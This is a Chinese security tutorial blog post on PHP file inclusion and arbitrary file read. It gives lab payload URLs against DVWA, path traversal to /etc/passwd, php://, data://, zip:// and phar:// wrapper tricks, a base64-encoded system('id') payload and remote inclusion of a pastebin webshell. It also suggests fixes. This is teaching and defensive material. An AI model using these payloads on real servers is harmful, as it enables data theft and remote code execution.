---
title: "文件包含与任意文件读取/下载漏洞"
permalink: file-inclusion-and-arbitrary-read/
date: 2025-12-15 01:28:44
categories:
  - 网络安全
  - Web 安全
tags:
  - 文件包含
  - LFI
  - 伪协议
img: /medias/featureimages/8.jpg
summary: "本地/远程文件包含、伪协议利用、日志写马、以及任意文件读取下载的利用与防御。"
---

<!-- more -->

## 文件包含
## 产生原因
开发者没有对用户传入的文件路径做验证，导致用户可以包含、读取、下载任意的文件

⚠️ 只有php 才有文件包含漏洞、其他语言和框架是任意文件读取、任意文件下载

## 危害
```php
泄露 服务器的敏感信息
php文件包含 漏洞会把包含的任意文件都当作php 代码解析执行（图片马+文件包含结合使用的原理）
```

## 挖掘
### 白盒
### 代码审计
```php
定位 php 文件包含函数 include、require、include_once、require_once
看函数的参数是否可控，是否有过滤
```

### include 与 require 的区别
```php
include 即使包含的文件不存在，也会继续执行后续的代码
require 如果包含的文件不存在，会报错 500 并停止执行后续的代码
```

### 黑盒
1 实现网站正常功能，看网站是否有参数键名如 file、page、path、lang 等与页面、路径有关的参数，如果有 就改为 /etc/passwd 或 C:\Windows\win.ini 进行尝试

2 关注网站的 下载功能、在线读取文件功能，看是否可以修改想看的 文件路径

## 利用
### 1 本地文件包含
任意文件读取、任意文件下载

#### 绝对路径
**Linux：/etc/passwd**

**windows：C:\Windows\win.ini**

/etc/hosts

C:\Windows\System32\drivers

#### 相对路径
`../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  `

### 2 包含图片马
php文件包含漏洞会把包含的任意文件都当作php代码解析执行

```php
上传图片马
文件包含漏洞 包含图片马
```

#### 相对路径

#### 绝对路径
`http://192.168.79.120:8082/vulnerabilities/fi/?page=/var/www/html/hackable/uploads/eval.gif`

`http://192.168.79.154/DVWA/vulnerabilities/fi/page=C:\phpstudy\PHPTutorial\WWW\DVWA\hackable\uploads\eval.gif`

⚠️ ：如果文件包含漏洞在后台，webshell 管理工具连接时需要加上 cookie

#### 练习：
##### 1 DVWA 文件上传图片马

##### 2  DVWA 文件包含漏洞包含图片马

##### 3 antsword连接

⚠️ ：如果文件包含漏洞在后台，webshell 管理工具连接时需要加上 cookie

#### 拓展： webshell 管理工具连接后台漏洞webshell
#### Godzilla

#### Behinder

## 3 远程文件包含
### 前提条件
php 配置文件中配置项 allow_url_include = On （默认是Off）

### 利用方式
包含文件是URL地址，php会把 URL地址请求到的内容 当做php代码解析执行

### 包含 webshell
靶机需要能够连接到自己的攻击机

### 攻击过程
```php
攻击机创建 webshell 文件 1.txt
攻击机开启监听
靶机包含攻击机的URL
```

###  pastbin
#### 1  创建 paste

#### 2  获取paste raw

#### 3  得到链接
 `[https://pastebin.com/raw/jAQadcin](https://pastebin.com/raw/jAQadcin)` 攻击远程文件包含漏洞的网站

#### 练习操作
##### 练习操作1：allow_url_include = On
DVWA 远程文件包含，执行 phpinfo 或 连接webshell （⚠️ 需要改 php 配置文件 allow_url_include = On）

##### 练习操作2：修复
修复 sagikazarmark/dvwa 镜像的远程文件包含漏洞 提示：修改php配置文件 allow_url_include = Off

1️⃣ `/etc/php5/apache2/php.ini`

👉 **Apache + PHP（mod_php）使用的配置文件**

+ 当你通过 **浏览器访问网站**
+ Apache 调用 PHP 时
+ **生效的就是这个配置**

2️⃣ `/etc/php5/cli/php.ini`

👉 **PHP 命令行（CLI）使用的配置文件**

+ 你在终端运行：php test.php
+ 生效的是 **这个 php.ini**

📌 特点：

+ 不影响网站
+ 常用于脚本、定时任务、测试

3️⃣ `/var/www/html/php.ini`

👉 **这是一个“项目级 / 自定义”的 php.ini**

+ **不是 PHP 默认配置路径**
+ 通常是：
    - 网站程序自己放的
    - 或运维/开发者手动创建的

⚠️ 是否生效取决于：

+ PHP 运行模式
+ 是否通过 `.user.ini` / `php_admin_value` / `ini_set()` 加载

通常：

+ **Apache 不会自动用它**
+ **CLI （命令行接口:  就是在终端 / 控制台里，通过敲命令来操作程序，而不是点鼠标  ）   也不会用它**

###### 方案1

###### 方案 2

## 4  php 伪协议 / php wrapper
### file
`file://绝对路径`

```php
必须要使用绝对路径
php配置文件 allow_url_fopen=on/off allow_url_include=on/off
```

####  Linux:
`file:///etc/passwd`

`http://192.168.79.120:8082/vulnerabilities/fi/?page=file:///etc/passwd`

####  windows:
`file://C:\Windows\win.ini`

`file:///C:\Windows\win.ini`

`http://192.168.79.154/DVWA/vulnerabilities/fi/?page=file:///C:\Windows\win.ini`

### php filter
```matlab
php://filter/read=convert.base64-encode/resource=相对或绝对路径
php://filter/string.rot13/resource=相对或绝对路径
```

+ 支持相对路径或绝对路径
+ php配置文件 allow_url_fopen=on/off allow_url_include=on/off
+ **作用是读取文件内容，不会解析执行**

#### 绝对路径
`http://192.168.79.120:8082/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=/**etc/passwd**`

#### 相对路径
`http://192.168.79.120:8082/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=**index.php**`

### php input
`php://input`

+ 作用:   读取请求体，如果是和 include/require函数联用，就会把请求体当做php代码执行
+ php配置文件 allow_url_fopen=on/off allow_url_include=on

### data
```matlab
data://text/plain,URL编码的PHP代码
data://text/plain;base64,base64编码的PHP代码
```

+ 执行 GET参数中的PHP代码
+ php配置文件 allow_url_fopen=on allow_url_include=on

```markdown
URL-decode（URL 解码）

URL-encode key characters（只编码关键字符）
只对 URL 中 必须转义的保留字符 进行编码，其它字符保持不变

URL-encode all characters（编码所有字符）
把 所有字符（包括字母、数字） 都编码成 %xx 形式。

URL-encode all characters (Unicode)
对所有字符进行 Unicode 级别的 URL 编码，适用于 中文 / 非 ASCII 字符
```

⚠️ 如果base64后出现了= 或 + ，要对 = 和 + 进行URL编码

<?php system("id");?>  ; PD9waHAgc3lzdGVtKCJpZCIpOz8+ ; PD9waHAgc3lzdGVtKCJpZCIpOz8%2b

### zip
`zip://绝对路径/zip压缩包的名字%23压缩包里php文件的名字`

+  读取压缩包内的文件
+  只能用绝对路径
+  php配置文件 allow_url_fopen=on/off allow_url_include=on/off

`http://192.168.79.120:8082/vulnerabilities/fi/?page=zip:///var/www/html/hackable/uploads/gh.zip%231.php`

`%23` 是 URL 编码后的 `#` 号

**#的作用：锚点**

### phar
`phar://相对或绝对路径/zip压缩包名(后缀可以任意)/压缩包里php文件的名字`

+ 读取压缩包内的文件
+ 绝对路径或相对路径都行
+ php配置文件 allow_url_fopen=on/off allow_url_include=on/off
+ 支持非zip后缀压缩包
+ phar 和部分函数联用时可能造成 phar 反序列化漏洞

`http://192.168.79.120:8082/vulnerabilities/fi/?page=phar://../../hackable/uploads/gh.jpg/1.php`

## 修复
1  黑名单过滤，过滤伪协议 php:// data:// ，过滤 ../

2  白名单具体的文件

3 关闭 allow_url_include ，远程文件包含、php://input 、data:// 将无法使用

4 在包含的文件前加前后缀 ，如下在用户输入的文件前加 目录，文件后加后缀

```php
<?php
  include("includes/".$_GET['file'].".php");
?>
```
